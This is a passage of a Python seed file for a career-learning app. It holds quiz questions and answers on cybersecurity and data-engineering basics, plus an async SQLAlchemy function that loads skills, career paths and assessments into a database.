                    "points": 5
                },
                {
                    "question_text": "Git is a centralized version control system.",
                    "question_type": "true_false",
                    "options": None,
                    "correct_answer": "False",
                    "points": 3
                }
            ]
        }
    ],
    "Cybersecurity Specialist": [
        {
            "title": "Cybersecurity Fundamentals Assessment",
            "description": "Test your knowledge of network security, web application security, and cryptography.",
            "time_limit": 30,
            "questions": [
                {
                    "question_text": "What does the CIA triad stand for in cybersecurity?",
                    "question_type": "multiple_choice",
                    "options": ["A) Central Intelligence Agency", "B) Confidentiality, Integrity, Availability", "C) Control, Inspect, Audit", "D) Create, Implement, Authorize"],
                    "correct_answer": "B) Confidentiality, Integrity, Availability",
                    "points": 5
                },
                {
                    "question_text": "Which OWASP Top 10 vulnerability involves inserting malicious SQL into queries?",
                    "question_type": "multiple_choice",
                    "options": ["A) Broken Access Control", "B) XSS", "C) Injection", "D) SSRF"],
                    "correct_answer": "C) Injection",
                    "points": 5
                },
                {
                    "question_text": "What type of encryption uses the same key for encryption and decryption?",
                    "question_type": "multiple_choice",
                    "options": ["A) Asymmetric", "B) Symmetric", "C) Hashing", "D) Steganography"],
                    "correct_answer": "B) Symmetric",
                    "points": 5
                },
                {
                    "question_text": "HTTPS uses TLS/SSL to encrypt data in transit between client and server.",
                    "question_type": "true_false",
                    "options": None,
                    "correct_answer": "True",
                    "points": 3
                },
                {
                    "question_text": "What is the principle of least privilege?",
                    "question_type": "multiple_choice",
                    "options": ["A) Give everyone admin access for convenience", "B) Grant users only the minimum permissions needed to perform their job", "C) Remove all access after 30 days", "D) Only allow access during business hours"],
                    "correct_answer": "B) Grant users only the minimum permissions needed to perform their job",
                    "points": 5
                },
                {
                    "question_text": "What tool is commonly used for network port scanning?",
                    "question_type": "multiple_choice",
                    "options": ["A) Wireshark", "B) Burp Suite", "C) Nmap", "D) Metasploit"],
                    "correct_answer": "C) Nmap",
                    "points": 3
                },
                {
                    "question_text": "Penetration testing should always be performed with written authorization.",
                    "question_type": "true_false",
                    "options": None,
                    "correct_answer": "True",
                    "points": 5
                }
            ]
        }
    ],
    "Data Engineer": [
        {
            "title": "Data Engineering Fundamentals Assessment",
            "description": "Test your knowledge of SQL, ETL pipelines, big data tools, and data architecture.",
            "time_limit": 25,
            "questions": [
                {
                    "question_text": "What does ETL stand for?",
                    "question_type": "multiple_choice",
                    "options": ["A) Extract, Test, Load", "B) Extract, Transform, Load", "C) Evaluate, Transform, Learn", "D) Extract, Transfer, Link"],
                    "correct_answer": "B) Extract, Transform, Load",
                    "points": 3
                },
                {
                    "question_text": "Which SQL clause is used with aggregate functions to filter groups?",
                    "question_type": "multiple_choice",
                    "options": ["A) WHERE", "B) ORDER BY", "C) HAVING", "D) GROUP BY"],
                    "correct_answer": "C) HAVING",
                    "points": 5
                },
                {
                    "question_text": "What is Apache Spark primarily used for?",
                    "question_type": "multiple_choice",
                    "options": ["A) Web server hosting", "B) Distributed data processing at scale", "C) Version control", "D) Container orchestration"],
                    "correct_answer": "B) Distributed data processing at scale",
                    "points": 5
                },
                {
                    "question_text": "Parquet is a columnar file format optimized for analytical queries on big data.",
                    "question_type": "true_false",
                    "options": None,
                    "correct_answer": "True",
                    "points": 3
                },
                {
                    "question_text": "What is a window function in SQL?",
                    "question_type": "multiple_choice",
                    "options": ["A) A function that opens a new database connection", "B) A function that performs calculations across rows related to the current row", "C) A function that creates database windows", "D) A function that filters NULL values"],
                    "correct_answer": "B) A function that performs calculations across rows related to the current row",
                    "points": 5
                },
                {
                    "question_text": "Apache Airflow is used for workflow orchestration and scheduling data pipelines.",
                    "question_type": "true_false",
                    "options": None,
                    "correct_answer": "True",
                    "points": 3
                },
                {
                    "question_text": "What makes an ETL pipeline 'idempotent'?",
                    "question_type": "multiple_choice",
                    "options": ["A) It runs very fast", "B) It can only run once", "C) Running it multiple times produces the same result", "D) It processes data in real-time"],
                    "correct_answer": "C) Running it multiple times produces the same result",
                    "points": 5
                }
            ]
        }
    ]
}


# ─────────────────────────────────────────────────────────────────────────────
# SEED FUNCTION
# ─────────────────────────────────────────────────────────────────────────────

async def seed_database(db):
    """Seed the database with initial data"""
    from sqlalchemy import select

    # Check if data already exists
    result = await db.execute(select(CareerPath))
    if result.scalar_one_or_none():
        return  # Data already seeded

    # Create skills
    skill_map = {}
    for skill_data in SKILLS_DATA:
        skill = Skill(
            name=skill_data["name"],
            category=skill_data["category"],
            level=skill_data["level"],
            description=skill_data["description"]
        )
        db.add(skill)
        await db.flush()
        skill_map[skill_data["name"]] = skill

    # Create career paths
    for path_data in CAREER_PATHS_DATA:
        learning_content_json = None
        if path_data.get("learning_content"):
            learning_content_json = json.dumps(path_data["learning_content"])

        career_path = CareerPath(
            title=path_data["title"],
            description=path_data["description"],
            category=path_data["category"],
            estimated_time=path_data["estimated_time"],
            difficulty=path_data["difficulty"],
            job_market_info=path_data["job_market_info"],
            salary_range=path_data["salary_range"],
            learning_content=learning_content_json
        )
        db.add(career_path)
        await db.flush()

        # Link skills to career path
        for idx, skill_name in enumerate(path_data["skills"]):
            if skill_name in skill_map:
                cp_skill = CareerPathSkill(
                    career_path_id=career_path.id,
                    skill_id=skill_map[skill_name].id,
                    is_required=True,
                    priority=idx
                )
                db.add(cp_skill)

    # Create assessments for each career path
    for path_title, assessments in ASSESSMENTS_DATA.items():
        result = await db.execute(select(CareerPath).where(CareerPath.title == path_title))
        career_path = result.scalar_one_or_none()
        if not career_path:
            continue

        for assessment_data in assessments:
            assessment = Assessment(
                title=assessment_data["title"],
                description=assessment_data["description"],
                career_path_id=career_path.id,
                time_limit=assessment_data["time_limit"]
            )
            db.add(assessment)
            await db.flush()

            for q_data in assessment_data["questions"]:
                question = AssessmentQuestion(
                    assessment_id=assessment.id,
                    question_text=q_data["question_text"],
                    question_type=q_data["question_type"],
                    options=json.dumps(q_data["options"]) if q_data["options"] else None,
                    correct_answer=q_data["correct_answer"],
                    points=q_data["points"]
                )
                db.add(question)

    await db.commit()
